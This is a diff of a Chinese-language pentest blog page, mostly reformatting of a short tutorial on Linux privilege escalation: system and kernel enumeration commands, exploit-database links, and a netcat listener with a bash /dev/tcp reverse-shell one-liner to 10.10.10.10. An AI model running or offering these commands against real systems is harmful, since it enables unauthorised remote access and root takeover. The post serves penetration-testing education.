@@ -82,34 +82,25 @@
     [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/intranet">intranet</a>)
 </div>
 
-      <div>
-
-<h3 id="0x00-linux下的提权">0x00 Linux下的提权</h3>
-
+      <div><h3 id="0x00-linux下的提权">0x00 Linux下的提权</h3>
 <p>Linux下一般都是系统漏洞提权，分为以下几个步骤：</p>
-
-<pre><code>1. 获取系统版本号
+<pre tabindex="0"><code>1. 获取系统版本号
 2. 根据系统版本号找对应exp
 3. 反弹shell
 4. 尝试利用
-</code></pre>
-
-<h3 id="0x01-提权">0x01 提权</h3>
-
+</code></pre><h3 id="0x01-提权">0x01 提权</h3>
 <ul>
 <li>获取系统版本号
-
 <ul>
 <li>获取发行版本
-
 <ul>
 <li>cat /etc/*-release</li>
 <li>cat /etc/issue</li>
 <li>cat /etc/lsb-release</li>
 <li>cat /etc/redhat-release</li>
-</ul></li>
+</ul>
+</li>
 <li>获取内核版本
-
 <ul>
 <li>cat /proc/version</li>
 <li>uname -a</li>
@@ -117,10 +108,11 @@
 <li>rpm -q kernel</li>
 <li>dmesg | grep Linux</li>
 <li>ls /boot | grep vmlinuz</li>
-</ul></li>
-</ul></li>
+</ul>
+</li>
+</ul>
+</li>
 <li>根据系统版本号找对应exp
-
 <ul>
 <li><a href="http://www.exploit-db.com">http://www.exploit-db.com</a></li>
 <li><a href="http://1337day.com">http://1337day.com</a></li>
@@ -131,33 +123,37 @@
 <li><a href="http://securityreason.com">http://securityreason.com</a></li>
 <li><a href="http://seclists.org/fulldisclosure">http://seclists.org/fulldisclosure</a></li>
 <li><a href="http://www.google.com">http://www.google.com</a></li>
-</ul></li>
+</ul>
+</li>
 <li>反弹shell
-
 <ul>
 <li>本地：<code>nc -l -p 8888</code></li>
 <li>目标机器：<code>/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/8888 0&gt;&amp;1</code></li>
-</ul></li>
+</ul>
+</li>
 <li>尝试利用</li>
 </ul>
-
 <h3 id="0x02-实例">0x02 实例</h3>
-
 <ul>
-<li><p>得到系统版本号
-<img src="/img/post/privilge_escalation_linux_get_sys_version.png" alt="得到系统版本号" /></p></li>
-
-<li><p>找对应exp
-<img src="/img/post/privilge_escalation_linux_search_exp.png" alt="找相应exp" />
-<img src="/img/post/privilge_escalation_linux_exp_code.png" alt="保存exp源码" /></p></li>
-
-<li><p>反弹shell
-<img src="/img/post/privilge_escalation_linux_webshell_rebound_shell.png" alt="反弹shell" /></p></li>
-
-<li><p>提权
-<img src="/img/post/privilge_escalation_linux_write_exp_code.png" alt="下载exp源码" />
-<img src="/img/post/privilge_escalation_linux_compile_exp_code.png" alt="编译exp源码" />
-<img src="/img/post/privilge_escalation_linux_run_exp.png" alt="运行exp" /></p></li>
+<li>
+<p>得到系统版本号
+<img src="/img/post/privilge_escalation_linux_get_sys_version.png" alt="得到系统版本号"></p>
+</li>
+<li>
+<p>找对应exp
+<img src="/img/post/privilge_escalation_linux_search_exp.png" alt="找相应exp">
+<img src="/img/post/privilge_escalation_linux_exp_code.png" alt="保存exp源码"></p>
+</li>
+<li>
+<p>反弹shell
+<img src="/img/post/privilge_escalation_linux_webshell_rebound_shell.png" alt="反弹shell"></p>
+</li>
+<li>
+<p>提权
+<img src="/img/post/privilge_escalation_linux_write_exp_code.png" alt="下载exp源码">
+<img src="/img/post/privilge_escalation_linux_compile_exp_code.png" alt="编译exp源码">
+<img src="/img/post/privilge_escalation_linux_run_exp.png" alt="运行exp"></p>
+</li>
 </ul>
 </div>
     </article>
